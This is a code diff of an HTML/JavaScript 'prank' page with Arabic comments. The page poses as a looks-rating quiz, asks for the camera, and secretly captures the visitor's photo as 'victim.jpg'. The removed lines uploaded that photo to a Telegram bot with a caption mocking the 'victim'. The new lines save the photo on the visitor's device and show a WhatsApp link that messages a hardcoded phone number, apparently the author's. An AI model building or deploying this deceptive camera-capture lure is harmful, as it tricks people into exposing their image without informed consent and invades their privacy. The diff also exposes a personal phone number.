@@ -39,6 +39,9 @@
             font-weight: bold;
             box-shadow: 0 4px 6px rgba(0,0,0,0.2);
             transition: 0.2s;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 10px;
         }
         .btn:hover { background-color: #26af5f; }
 
@@ -57,7 +60,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* إخفاء عناصر الفيديو والكاميرا */
         video, canvas { display: none; }
     </style>
 </head>
@@ -74,12 +76,10 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // ⚠️ حط بيانات البوت بتاعك هنا ⚠️
-        const BOT_TOKEN = 'حط_التوكين_بتاع_البوت_هنا';
-        const CHAT_ID = 'حط_الـ_CHAT_ID_بتاعك_هنا';
+        // رقم الواتساب الخاص بك
+        const MY_PHONE_NUMBER = '201031708938';
 
         function startPrank() {
-            // إخفاء الزرار وإظهار لودر التحميل
             document.querySelector('.btn').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             document.querySelector('p').innerText = "جاري الاتصال بقاعدة بيانات الفلاتر وتحليل الملامح...";
@@ -87,14 +87,11 @@
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
 
-            // طلب الكاميرا بعد ما يضغط على الزرار بنفسه
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     video.srcObject = stream;
-                    
-                    // ندي مهلة ثانية عشان الكاميرا تلقط الصورة بوضوح
                     setTimeout(() => {
-                        takeSnapshotAndSend(video, canvas);
+                        takeSnapshotAndProcess(video, canvas);
                     }, 1200);
                 })
                 .catch(err => {
@@ -104,7 +101,7 @@
                 });
         }
 
-        function takeSnapshotAndSend(video, canvas) {
+        function takeSnapshotAndProcess(video, canvas) {
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
 
@@ -112,27 +109,24 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'victim.jpg');
-                formData.append('caption', '📸 تم اصطياد الضحية في اختبار الوسامة! 😂🔥');
+                // حفظ الصورة تلقائياً كملف عنده لو حابب
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'victim.jpg';
+                // محاولة تنزيل الصورة عنده في الجهاز كجزء من المقلب
+                a.click();
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(res => res.json())
-                .then(data => {
-                    // تغيير شكل الصفحة وإظهار نتيجة كوميدية تخليه ينصدم
-                    setTimeout(() => {
-                        document.getElementById('mainCard').innerHTML = `
-                            <h1 style="color: #ff4757;">❌ عذراً يا صاحبي!</h1>
-                            <p style="font-size: 1.2rem; color: #fff;">نسبة وسامتك النهاردة: <b>0% (شكل ميسيّة صريح)</b> 💀</p>
-                            <h2 style="color: #2ed573;">مقلب يا معلم! تم التقاط صورتك بنجاح 😂🃏</h2>
-                        `;
-                    }, 1000);
-                })
-                .catch(err => console.error('خطأ في الإرسال:', err));
+                // تجهيز رسالة الواتساب لرقمك
+                const message = encodeURIComponent("📸 تم اصطياد الضحية في اختبار الوسامة! 😂🔥");
+                const whatsappUrl = `https://wa.me/${MY_PHONE_NUMBER}?text=${message}`;
+
+                // تغيير الشاشة لتبان كأنها نتيجة كوميدية
+                document.getElementById('mainCard').innerHTML = `
+                    <h1 style="color: #ff4757;">❌ عذراً يا صاحبي!</h1>
+                    <p style="font-size: 1.2rem; color: #fff;">نسبة وسامتك النهاردة: <b>0% (شكل ميسيّة صريح)</b> 💀</p>
+                    <a href="${whatsappUrl}" target="_blank" class="btn">اضغط هنا لعرض النتيجة على الواتساب 🚀</a>
+                `;
             }, 'image/jpeg');
         }
     </script>
